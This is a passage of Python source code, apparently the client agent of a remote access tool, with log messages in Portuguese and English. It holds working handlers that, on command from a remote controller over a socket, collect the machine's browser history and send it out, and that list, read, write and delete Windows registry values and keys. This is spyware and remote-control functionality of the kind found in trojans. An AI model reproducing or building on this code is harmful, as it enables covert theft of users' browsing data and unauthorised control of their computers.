                chunk = self.connector.client_socket.recv(min(bytes_remaining, 8192))
                if not chunk:
                    return None
                data += chunk
                bytes_remaining -= len(chunk)
            return data
        except socket.timeout:
            logger.error(f"Timeout ao receber dados ({timeout}s)")
            return None
        except Exception as e:
            logger.error(f"Erro ao receber dados: {str(e)}")
            return None
        finally:
            self.connector.client_socket.settimeout(original_timeout)
    def _handle_browser_history_request(self):
        logger.info("Solicitação de histórico de navegadores recebida")
        threading.Thread(
            target=self._collect_and_send_browser_history,
            daemon=True
        ).start()
    def _collect_and_send_browser_history(self):
        try:
            if not self.browser_history_manager:
                logger.error("Gerenciador de histórico de navegadores não disponível")
                self._send_browser_history_error("Gerenciador de histórico não disponível")
                return
            logger.info("Coletando histórico de navegadores")
            history_data = self.browser_history_manager.collect_history()
            history_bytes = history_data.encode('utf-8')
            logger.info(f"Enviando histórico de navegadores ({len(history_bytes) / 1024:.2f} KB)")
            socket = self.connector.client_socket
            if socket:
                send_binary_command(socket, CMD_BROWSER_HISTORY_RESPONSE, history_bytes)
            else:
                logger.error("Socket não disponível para enviar histórico")
        except Exception as e:
            logger.error(f"Erro ao processar histórico de navegadores: {str(e)}")
            self._send_browser_history_error(f"Erro: {str(e)}")
    def _send_browser_history_error(self, error_message):
        try:
            error_json = json.dumps({"error": error_message}).encode('utf-8')
            socket = self.connector.client_socket
            if socket:
                send_binary_command(socket, CMD_BROWSER_HISTORY_RESPONSE, error_json)
                logger.info(f"Mensagem de erro de histórico enviada: {error_message}")
        except Exception as e:
            logger.error(f"Erro ao enviar mensagem de erro de histórico: {str(e)}")
    def _handle_registry_list_request(self):
        try:
            if not self.registry_manager:
                logger.error("Registry manager not available")
                self._send_registry_error_response(CMD_REGISTRY_LIST_RESPONSE, "Registry manager not available")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket not available")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Error receiving parameters size")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            hkey = params.get('hkey', '')
            path = params.get('path', '')
            logger.info(f"Listing registry key: {hkey}\\{path}")
            result = self.registry_manager.list_keys(hkey, path)
            response = json.dumps(result).encode('utf-8')
            send_binary_command(socket, CMD_REGISTRY_LIST_RESPONSE, response)
        except Exception as e:
            logger.error(f"Error handling registry list request: {str(e)}")
            self._send_registry_error_response(CMD_REGISTRY_LIST_RESPONSE, str(e))
    def _handle_registry_read_request(self):
        try:
            if not self.registry_manager:
                logger.error("Registry manager not available")
                self._send_registry_error_response(CMD_REGISTRY_READ_RESPONSE, "Registry manager not available")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket not available")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Error receiving parameters size")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            hkey = params.get('hkey', '')
            path = params.get('path', '')
            name = params.get('name', '')
            logger.info(f"Reading registry value: {hkey}\\{path}\\{name}")
            result = self.registry_manager.read_value(hkey, path, name)
            response = json.dumps(result).encode('utf-8')
            send_binary_command(socket, CMD_REGISTRY_READ_RESPONSE, response)
        except Exception as e:
            logger.error(f"Error handling registry read request: {str(e)}")
            self._send_registry_error_response(CMD_REGISTRY_READ_RESPONSE, str(e))
    def _handle_registry_write_request(self):
        try:
            if not self.registry_manager:
                logger.error("Registry manager not available")
                self._send_registry_error_response(CMD_REGISTRY_WRITE_RESPONSE, "Registry manager not available")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket not available")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Error receiving parameters size")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            hkey = params.get('hkey', '')
            path = params.get('path', '')
            name = params.get('name', '')
            data = params.get('data', '')
            data_type = params.get('type', 'REG_SZ')
            logger.info(f"Writing registry value: {hkey}\\{path}\\{name}")
            result = self.registry_manager.write_value(hkey, path, name, data, data_type)
            response = json.dumps(result).encode('utf-8')
            send_binary_command(socket, CMD_REGISTRY_WRITE_RESPONSE, response)
        except Exception as e:
            logger.error(f"Error handling registry write request: {str(e)}")
            self._send_registry_error_response(CMD_REGISTRY_WRITE_RESPONSE, str(e))
    def _handle_registry_delete_value_request(self):
        try:
            if not self.registry_manager:
                logger.error("Registry manager not available")
                self._send_registry_error_response(CMD_REGISTRY_DELETE_VALUE_RESPONSE, "Registry manager not available")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket not available")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Error receiving parameters size")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            hkey = params.get('hkey', '')
            path = params.get('path', '')
            name = params.get('name', '')
            logger.info(f"Deleting registry value: {hkey}\\{path}\\{name}")
            result = self.registry_manager.delete_value(hkey, path, name)
            response = json.dumps(result).encode('utf-8')
            send_binary_command(socket, CMD_REGISTRY_DELETE_VALUE_RESPONSE, response)
        except Exception as e:
            logger.error(f"Error handling registry delete value request: {str(e)}")
            self._send_registry_error_response(CMD_REGISTRY_DELETE_VALUE_RESPONSE, str(e))
    def _handle_registry_create_key_request(self):
        try:
            if not self.registry_manager:
                logger.error("Registry manager not available")
                self._send_registry_error_response(CMD_REGISTRY_CREATE_KEY_RESPONSE, "Registry manager not available")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket not available")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Error receiving parameters size")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            hkey = params.get('hkey', '')
            path = params.get('path', '')
            logger.info(f"Creating registry key: {hkey}\\{path}")
            result = self.registry_manager.create_key(hkey, path)
            response = json.dumps(result).encode('utf-8')
            send_binary_command(socket, CMD_REGISTRY_CREATE_KEY_RESPONSE, response)
        except Exception as e:
            logger.error(f"Error handling registry create key request: {str(e)}")
            self._send_registry_error_response(CMD_REGISTRY_CREATE_KEY_RESPONSE, str(e))
    def _handle_registry_delete_key_request(self):
        try:
            if not self.registry_manager:
                logger.error("Registry manager not available")
                self._send_registry_error_response(CMD_REGISTRY_DELETE_KEY_RESPONSE, "Registry manager not available")
                return
            socket = self.connector.client_socket
            if not socket:
                logger.error("Socket not available")
                return
            size_data = socket.recv(4)
            if not size_data or len(size_data) != 4:
                logger.error("Error receiving parameters size")
                return
            data_size = struct.unpack('>I', size_data)[0]
            params_data = socket.recv(data_size)
            params = json.loads(params_data.decode('utf-8'))
            hkey = params.get('hkey', '')
            path = params.get('path', '')
            logger.info(f"Deleting registry key: {hkey}\\{path}")
            result = self.registry_manager.delete_key(hkey, path)
            response = json.dumps(result).encode('utf-8')
            send_binary_command(socket, CMD_REGISTRY_DELETE_KEY_RESPONSE, response)
        except Exception as e:
            logger.error(f"Error handling registry delete key request: {str(e)}")
            self._send_registry_error_response(CMD_REGISTRY_DELETE_KEY_RESPONSE, str(e))
    def _send_registry_error_response(self, cmd, error_message):
        try:
            socket = self.connector.client_socket
            if socket:
                error_data = json.dumps({"error": error_message}).encode('utf-8')
                send_binary_command(socket, cmd, error_data)
                logger.error(f"Registry error sent: {error_message}")
        except Exception as e:
            logger.error(f"Error sending registry error message: {str(e)}")
